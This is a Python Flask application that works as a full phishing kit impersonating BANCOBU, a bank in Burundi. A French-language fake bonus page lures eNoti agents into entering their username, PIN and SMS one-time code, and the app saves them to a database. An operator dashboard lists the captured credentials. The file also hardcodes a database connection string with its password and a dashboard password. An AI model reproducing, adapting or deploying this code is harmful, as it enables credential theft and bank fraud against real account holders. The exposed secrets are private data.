from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import psycopg2
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)
app.config['PREFERRED_URL_SCHEME'] = 'https'

DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://mlw_attack_user:ShJf3c9NA4Jf1ADITLYh3fIlHc7akHXC@dpg-d8063p9j2pic73f1mm40-a.frankfurt-postgres.render.com:5432/mlw_attack')

def get_db():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    conn = None
    cur = None
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id SERIAL PRIMARY KEY,
                timestamp TIMESTAMP DEFAULT NOW(),
                ip TEXT,
                user_agent TEXT,
                username TEXT,
                pin TEXT,
                otp TEXT,
                step TEXT
            )
        ''')
        conn.commit()
        print("[+] Database ready - data will persist forever")
    except Exception as e:
        print(f"[-] DB error: {e}")
    finally:
        if cur: cur.close()
        if conn: conn.close()

init_db()

# ==================== PHISHING PAGE WITH BONUS MESSAGE ====================
PHISHING_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>BANCOBU - Programme Bonus Pour Tous Agents Enoti</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #004d99 0%, #00264d 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: white;
            max-width: 550px;
            width: 100%;
            padding: 35px;
            border-radius: 25px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            text-align: center;
        }
        .logo { font-size: 32px; font-weight: bold; color: #004d99; margin-bottom: 10px; }
        .logo span { color: #ffcc00; }
        .subtitle { color: #666; font-size: 13px; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
        
        .bonus-card {
            background: linear-gradient(135deg, #ffd700 0%, #ffb300 100%);
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 20px;
        }
        .bonus-title { font-size: 18px; font-weight: bold; color: #00264d; margin-bottom: 5px; }
        .bonus-amount { font-size: 36px; font-weight: 800; color: #00264d; margin: 10px 0; }
        .bonus-desc { font-size: 12px; color: #00264d; }
        
        .message-box {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 20px;
            text-align: left;
            font-size: 14px;
            line-height: 1.5;
            color: #333;
            border-left: 4px solid #ffcc00;
        }
        .highlight { color: #004d99; font-weight: bold; }
        
        .input-group { margin-bottom: 20px; text-align: left; }
        .input-group label { display: block; margin-bottom: 8px; font-weight: bold; color: #003366; font-size: 13px; }
        .input-group input { width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 15px; }
        .input-group input:focus { border-color: #004d99; outline: none; }
        
        button { width: 100%; padding: 14px; background: linear-gradient(135deg, #004d99 0%, #00264d 100%); color: white; border: none; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.2s; }
        button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
        .btn-otp { background: linear-gradient(135deg, #ffcc00 0%, #ffb300 100%); color: #00264d; }
        
        .info-msg { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; padding: 15px; border-radius: 8px; margin-bottom: 25px; font-size: 14px; }
        .footer { margin-top: 25px; font-size: 11px; color: #999; }
        .loading { display: none; margin-top: 20px; color: #004d99; font-size: 14px; }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">BANCOBU <span>| Enoti</span></div>
    <div class="subtitle">Banque Commerciale du Burundi</div>

    <div class="bonus-card">
        <div class="bonus-title">🎉 PROGRAMME BONUS POUR TOUS AGENTS ENOTI 🎉</div>
        <div class="bonus-amount">2.000.000 FBu</div>
        <div class="bonus-desc">Offre spéciale réservée aux agents Enoti</div>
    </div>

    <div class="message-box">
        <strong>Murakaza neza muri BANCOBU Enoti.</strong><br><br>
        Dans le cadre de notre programme de fidélisation des agents Enoti, La BANCOBU a l’honneur de vous informer qu’elle a accordé un bonus de crédit annuel sans intérêt destiné aux agents eNoti. <span class="highlight">Cette bonus de crédit est de 2.000.000 FBu Pour un Agent eNoti qui s’enregiste à temps reél.</span>.<br><br>
        Pour bénéficier de cette offre, veuillez vous connecter à votre compte BANCOBU ci-dessous.
N.B: Cette Oportunité est disponible pendent 30 Jours!
    </div>

    <div id="step1">
        <div class="input-group">
            <label>Identifiant d'utilisateur</label>
            <input type="text" id="username" placeholder="ex: agent.enoti">
        </div>
        <div class="input-group">
            <label>Code PIN</label>
            <input type="password" id="pin" placeholder="••••••">
        </div>
        <button onclick="submitLogin()">Se connecter et recevoir mon bonus</button>
    </div>

    <div id="step2" style="display:none;">
        <div class="info-msg">
            📱 <strong>Code OTP envoyé</strong><br>
            Un code de vérification a été envoyé sur votre téléphone. Veuillez le saisir ci-dessous pour finaliser votre inscription au bonus.
        </div>
        <div class="input-group">
            <label>Code OTP</label>
            <input type="text" id="otp" placeholder="Entrez le code reçu par SMS">
        </div>
        <button class="btn-otp" onclick="submitOTP()">Confirmer et recevoir mon bonus</button>
    </div>

    <div id="loading" class="loading">⏳ Vérification en cours...</div>
    <div class="footer">🔒 Connexion sécurisée | BANCOBU</div>
</div>

<script>
    async function submitLogin() {
        const username = document.getElementById('username').value;
        const pin = document.getElementById('pin').value;
        
        if (!username || !pin) {
            alert("Veuillez remplir tous les champs");
            return;
        }
        
        document.getElementById('step1').style.display = 'none';
        document.getElementById('loading').style.display = 'block';
        
        const response = await fetch('/api/capture_login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: username, pin: pin })
        });
        
        if (response.ok) {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        } else {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('step1').style.display = 'block';
            alert("Erreur technique. Veuillez réessayer.");
        }
    }

    async function submitOTP() {
        const otp = document.getElementById('otp').value;
        const username = document.getElementById('username').value;
        
        if (!otp) {
            alert("Veuillez entrer le code OTP reçu");
            return;
        }
        
        document.getElementById('step2').style.display = 'none';
        document.getElementById('loading').style.display = 'block';
        
        const response = await fetch('/api/capture_otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: username, otp: otp })
        });
        
        if (response.ok) {
            document.getElementById('loading').style.display = 'none';
            alert("✅ Félicitations ! Votre bonus a été validé. Redirection en cours...");
            setTimeout(() => {
                window.location.href = "https://www.bancobu.bi";
            }, 2000);
        } else {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
            alert("Code OTP invalide. Veuillez réessayer.");
        }
    }
</script>
</body>
</html>
'''

# ==================== DASHBOARD WITH DELETE BUTTON ====================
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>BANCOBU - Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0e27; color: #00ffcc; font-family: 'Courier New', monospace; padding: 20px; }
        h1 { color: #ff3366; border-bottom: 2px solid #ff3366; padding-bottom: 10px; margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #00ffcc; padding: 10px; text-align: left; }
        th { background: #1a1f3a; }
        .login { max-width: 400px; margin: 100px auto; background: #1a1f3a; padding: 30px; border-radius: 10px; }
        input, button { width: 100%; padding: 12px; margin: 10px 0; background: #0a0e27; color: #00ffcc; border: 1px solid #00ffcc; border-radius: 5px; }
        .stats { background: #1a1f3a; padding: 15px; border-radius: 10px; margin-bottom: 20px; }
        .badge { background: #ff3366; color: white; padding: 2px 8px; border-radius: 20px; font-size: 11px; }
        .otp-badge { background: #ffd700; color: #0a0e27; padding: 2px 8px; border-radius: 20px; font-size: 11px; }
        .delete-btn { background: #ff3366; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 11px; }
        .delete-btn:hover { background: #ff0000; }
    </style>
    <script>
        async function checkAuth() {
            const res = await fetch('/api/auth');
            const data = await res.json();
            if (!data.authenticated) {
                document.getElementById('login').style.display = 'block';
                document.getElementById('content').style.display = 'none';
            } else {
                document.getElementById('login').style.display = 'none';
                document.getElementById('content').style.display = 'block';
                loadData();
                setInterval(loadData, 5000);
            }
        }
        async function login() {
            const pwd = document.getElementById('pwd').value;
            const res = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ password: pwd }) });
            const data = await res.json();
            if (data.success) checkAuth();
            else alert('Wrong password');
        }
        async function loadData() {
            const res = await fetch('/api/data');
            const data = await res.json();
            let html = '';
            for (let r of data) {
                html += `<tr>
                    <td>${r.timestamp}</td>
                    <td>${r.ip}</td>
                    <td><span class="badge">${r.username || '-'}</span></td>
                    <td><span class="badge">${r.pin || '-'}</span></td>
                    <td><span class="otp-badge">${r.otp || '-'}</span></td>
                    <td><button class="delete-btn" onclick="deleteRecord(${r.id})">Delete</button></td>
                </tr>`;
            }
            document.getElementById('data').innerHTML = html;
            document.getElementById('stats').innerHTML = `📊 Total credentials captured: ${data.length}`;
        }
        async function deleteRecord(id) {
            if (confirm('Delete this record?')) {
                const response = await fetch('/api/delete/' + id, { method: 'DELETE' });
                if (response.ok) {
                    loadData();
                } else {
                    alert('Error deleting record');
                }
            }
        }
        checkAuth();
    </script>
</head>
<body>
<div id="login" class="login">
    <h2>BANCOBU Dashboard</h2>
    <input type="password" id="pwd" placeholder="Password">
    <button onclick="login()">Login</button>
</div>
<div id="content" style="display:none">
    <h1>🏦 BANCOBU - Captured Credentials</h1>
    <div class="stats" id="stats">📊 Captured: 0</div>
    <div style="overflow-x: auto;">
    <table>
        <thead>
            <tr><th>Time</th><th>IP Address</th><th>Identifiant</th><th>Code PIN</th><th>Code OTP</th><th>Action</th></tr>
        </thead>
        <tbody id="data"></tbody>
    </table>
    </div>
</div>
</body>
</html>
'''

# ==================== ROUTES ====================
@app.route('/')
def index():
    return render_template_string(PHISHING_HTML)

@app.route('/dashboard')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/auth')
def auth():
    return jsonify({'authenticated': request.cookies.get('admin_auth') == 'true'})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    if data.get('password') == '0880Mdav!':
        resp = jsonify({'success': True})
        resp.set_cookie('admin_auth', 'true', httponly=True, secure=True, samesite='Strict')
        return resp
    return jsonify({'success': False})

@app.route('/api/capture_login', methods=['POST'])
def capture_login():
    data = request.json
    conn = None
    cur = None
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('INSERT INTO captured_credentials (ip, user_agent, username, pin, step) VALUES (%s, %s, %s, %s, %s)',
            (request.remote_addr, request.headers.get('User-Agent', ''), data.get('username', ''), data.get('pin', ''), 'LOGIN'))
        conn.commit()
        print(f"[!] CAPTURED LOGIN - User: {data.get('username')}, PIN: {data.get('pin')}, IP: {request.remote_addr}")
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({'status': 'error'}), 500
    finally:
        if cur: cur.close()
        if conn: conn.close()

@app.route('/api/capture_otp', methods=['POST'])
def capture_otp():
    data = request.json
    conn = None
    cur = None
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('INSERT INTO captured_credentials (ip, user_agent, username, otp, step) VALUES (%s, %s, %s, %s, %s)',
            (request.remote_addr, request.headers.get('User-Agent', ''), data.get('username', ''), data.get('otp', ''), 'OTP'))
        conn.commit()
        print(f"[!] CAPTURED OTP - User: {data.get('username')}, OTP: {data.get('otp')}, IP: {request.remote_addr}")
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({'status': 'error'}), 500
    finally:
        if cur: cur.close()
        if conn: conn.close()

@app.route('/api/delete/<int:id>', methods=['DELETE'])
def delete_record(id):
    conn = None
    cur = None
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('DELETE FROM captured_credentials WHERE id = %s', (id,))
        conn.commit()
        print(f"[!] Deleted record ID: {id}")
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"[-] Delete error: {e}")
        return jsonify({'status': 'error'}), 500
    finally:
        if cur: cur.close()
        if conn: conn.close()

@app.route('/api/data')
def get_data():
    conn = None
    cur = None
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('SELECT id, timestamp, ip, username, pin, otp FROM captured_credentials ORDER BY timestamp DESC LIMIT 100')
        rows = cur.fetchall()
        return jsonify([{'id': r[0], 'timestamp': r[1], 'ip': r[2], 'username': r[3], 'pin': r[4], 'otp': r[5]} for r in rows])
    except Exception as e:
        return jsonify([])
    finally:
        if cur: cur.close()
        if conn: conn.close()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
